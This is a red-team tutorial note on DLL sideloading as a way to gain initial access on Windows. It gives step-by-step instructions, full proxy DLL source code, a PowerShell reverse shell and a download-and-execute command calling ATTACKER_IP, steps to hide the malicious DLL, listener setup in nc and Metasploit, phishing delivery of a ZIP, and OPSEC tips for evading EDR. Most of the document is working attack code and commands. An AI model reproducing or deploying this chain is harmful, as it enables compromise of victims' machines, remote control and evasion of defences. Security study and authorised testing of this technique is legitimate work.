---
title: Client Side Attacks with File Containers (DLLs)
draft: false
tags:
  - red-teaming
  - dll-sideloading
  - motw
  - windows
  - initial-access
  - evasion
---

This technique packages a **Microsoft-signed legitimate binary** together with a **malicious proxy DLL** inside a ZIP archive. When the victim extracts and runs the signed binary, it loads the malicious DLL via Windows DLL search order hijacking — executing the payload in the context of a trusted, signed process. This bypasses [[Mark of the Web (MotW)]] restrictions because the payload is never a standalone executable and the signed binary carries implicit trust.

**Why this works:**
- Windows loads DLLs from the application directory first (before System32)
- Many legitimate binaries load optional DLLs not present on the system — if missing, Windows silently skips them
- An unsigned malicious DLL CAN be loaded by a signed binary: Windows does not verify DLL signatures unless the application explicitly does so (uncommon)
- The signed binary itself is not malicious → SmartScreen, AV, and user trust all focus on the binary, not the hidden DLL

See [[Mark of the Web (MotW)]] for context on why containers are used to deliver this.

---
# Step 1 — Find a Suitable Binary and Missing DLL

Identify a Microsoft-signed binary that loads a DLL not present on the system (so our DLL will be picked up from the local directory instead).

**Example:** `OneDrive.exe` located at `C:\Program Files\Microsoft OneDrive`

**Windows DLL Search Order** (simplified — SafeDllSearchMode enabled):
1. The directory the application was loaded from ← **our malicious DLL goes here**
2. `C:\Windows\System32`
3. `C:\Windows\System` (16-bit)
4. `C:\Windows`
5. Current working directory
6. Directories in `%PATH%`

Use **ProcMon** (Sysinternals) to find missing DLL loads. Transfer it to the target machine if needed (see [[Windows File Transfer]]).

Set these ProcMon filters to find sideloading opportunities:
1. **Process Name** contains `OneDrive` (or your target binary)
2. **Operation** is `CreateFile`
3. **Result** is `NAME_NOT_FOUND`
4. **Path** ends with `.dll`
5. **Process Name** is NOT `Procmon.exe`

Apply filters, then launch the binary and watch for NAME_NOT_FOUND DLL loads.

![[Pasted image 20260628230333.png]]

In this example, the target DLL is **Secur32.dll**.

---
# Step 2 — Understand DLL Proxying

Simply creating a malicious DLL with the target name will likely crash the host application if it expects to call functions from the real DLL. **DLL Proxying** solves this: our fake DLL exports the same functions as the original and forwards all calls to the real DLL — while also running our malicious code on load.

The proxy DLL:
- Exports all the functions the application expects
- Forwards those calls transparently to the real system DLL
- Executes our payload in `DllMain` on `DLL_PROCESS_ATTACH` (when first loaded)

> [!Tip]
> Windows does not verify DLL signatures before loading unless the application explicitly implements signature checking (still uncommon). An unsigned malicious DLL can be loaded by a signed, trusted executable without warnings.

---
# Step 3a — Manual DLL Proxy (Simple Case)

Use this approach when only a small number of functions need to be forwarded.

Create a new Dynamic-Link Library (DLL) project in Visual Studio and replace `dllmain.cpp` with:

```cpp
#include "pc h.h"
#include <Windows.h>

// Path to the real DLL — using device path to avoid PATH resolution issues
#ifdef _WIN64
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\secur32.dll"
#else
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\secur32.dll"
#endif

// Forward the exported function from our proxy to the real DLL
#pragma comment(linker, "/EXPORT:GetUserNameExW=" DLLPATH ".GetUserNameExW")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
    {
        // ===== INSERT PAYLOAD HERE =====
        MessageBoxA(NULL, "Loaded from malicious DLL", "PoC", 0);
        // ===== END PAYLOAD =====
    }
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

> [!Note]
> If the binary requires more functions than you've exported, it will crash on load. You'll see an error like "The procedure entry point X could not be located in the dynamic link library". Fix by exporting all required functions — use Step 3b (automatic proxy) instead.

![[Pasted image 20260629183252.png]]

---
# Step 3b — Automatic DLL Proxy (Recommended)

The [Perfect DLL Proxy](https://github.com/mrexodia/perfect-dll-proxy) tool reads the original DLL's export table and auto-generates a C++ proxy that forwards all exported functions.

1. Install the tool on a Windows machine with Python:
```cmd
C:\> pip install perfect-dll-proxy
```

2. Generate the proxy DLL from the legitimate DLL:
```cmd
C:\> python perfect_dll_proxy.py C:\Windows\System32\secur32.dll
# Outputs: secur32.cpp (and secur32.def)
```

> [!Important]
> Before generating, the DLL name must match the target DLL name exactly (e.g., `secur32.dll`). The generated forward paths reference the DLL by name.

3. Open the generated `.cpp` file in Visual Studio and inject your payload into `DllMain`:

**Payload Option A — PoC MessageBox:**
```cpp
case DLL_PROCESS_ATTACH:
{
    MessageBoxA(NULL, "Executing from Malicious DLL", "PoC", 0);
}
```

**Payload Option B — Execute a process:**
```cpp
case DLL_PROCESS_ATTACH:
{
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    CreateProcessA(
        NULL,
        (LPSTR)"calc.exe",   // replace with payload command
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );
}
```

**Payload Option C — PowerShell reverse shell (hidden window):**

First, generate the encoded PowerShell payload on the attack machine:
```powershell
# Option 1: Direct TCP reverse shell (self-contained)
$Text = '$callback = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", ATTACKER_PORT);' +
        '$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{0};' +
        'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){' +
        '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);' +
        '$sendback = (iex $data 2>&1 | Out-String);' +
        '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";' +
        '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);' +
        '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()'
$MyBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Text))
Write-Output $MyBase64

# Option 2: In-memory download and execute (downloads run.ps1 from attacker server)
$Text2 = "(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/run.ps1') | IEX"
$MyBase64_2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Text2))
Write-Output $MyBase64_2
```

> [!Note]
> The powershell script `run.ps1` contains the following content (PS1 reverse shell, same as option 1):
> ```powershell
> $client = New-Object System.Net.Sockets.TCPClient('LOCAL_IP',LOCAL_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```

Then inject the base64 encoded command into the DLL's `DllMain` (hidden window):
```cpp
case DLL_PROCESS_ATTACH:
{
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;          // hide the PowerShell window

    CreateProcessA(
        NULL,
        (LPSTR)"cmd.exe /c powershell -ep bypass -enc <BASE64_PAYLOAD_HERE>",
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,              // no console window
        NULL,
        NULL,
        &si,
        &pi
    );
}
```

---
# Step 4 — Compile the Proxy DLL

**On Windows (Visual Studio):**
- Create a new Dynamic-Link Library (DLL) Project
- Paste the full code into the cpp file
- Change build configuration from **Debug** to **Release**
- Target: **x64** (match the target binary architecture)
- Build → Build Solution

**On Linux (cross-compile):**
```bash
$ x86_64-w64-mingw32-g++ -shared -o secur32.dll secur32.cpp -lws2_32
```

---
# Step 5 — Package and Deliver

1. Rename your compiled DLL to the target name (`secur32.dll`) and rename the real system DLL copy to avoid collision (only needed if testing locally — in delivery the real DLL is at `System32`, not in the ZIP):
```cmd
C:\> rename secur32.dll secur32.original.dll   # backup real DLL (local testing only)
```

2. Mark the malicious DLL as hidden to reduce visibility when the victim opens the ZIP:
```cmd
C:\> attrib +h secur32.dll
```

3. Package the signed binary and the hidden malicious DLL into a ZIP:
```powershell
# Use 7-Zip (PowerShell Compress-Archive does NOT handle hidden files correctly)
PS> & "C:\Program Files\7-Zip\7z.exe" a -tzip payload.zip .\OneDrive.exe .\secur32.dll
```

4. Start a listener:
```bash
$ nc -nvlp ATTACKER_PORT

# Or MSF handler:
msf> use multi/handler
msf> set payload windows/x64/meterpreter/reverse_https
msf> set LHOST ATTACKER_IP
msf> set LPORT 443
msf> run -j
```

5. Send the ZIP as a phishing email attachment. When the victim extracts and double-clicks `OneDrive.exe`, Windows loads `secur32.dll` from the local directory — executing the payload.

> [!Note]
> Use a convincing filename for the signed binary if possible. `OneDrive.exe` is recognizable — you may find other signed binaries with less suspicious names through ProcMon analysis.

---
# OPSEC

> [!Warning] OPSEC
> - The signed binary and malicious DLL are extracted to the victim's disk. EDR solutions may flag the DLL load event even if the DLL itself isn't detected as malicious — behavioral rules often alert on unsigned DLLs loaded by signed Microsoft binaries from non-standard paths.
> - `DLL_PROCESS_ATTACH` runs synchronously on the main thread. Long-running code (e.g., a direct TCP shell loop) here will block the host application from starting — use a new thread or an async approach for your payload.
> - Use the in-memory PowerShell download option (Option 2) to avoid writing the reverse shell to disk.
> - `CREATE_NO_WINDOW` + `SW_HIDE` reduce visible indicators on the victim screen but don't prevent process creation telemetry in EDR.
> - Prefer `reverse_https` over `reverse_tcp` — encrypted HTTPS traffic on port 443 blends with normal browsing.
> - Test with Windows Defender real-time protection off first to confirm payload execution, then work on evasion.

---
# Related Notes
- [[Mark of the Web (MotW)]] — why container delivery bypasses MoTW restrictions
- [[AV Evasion]] — further evasion once DLL is executing
- [[Phishing with Microsoft Office]] — alternative initial access via Office macros
- [[Client-Side Attacks]] — overview of all client-side delivery vectors
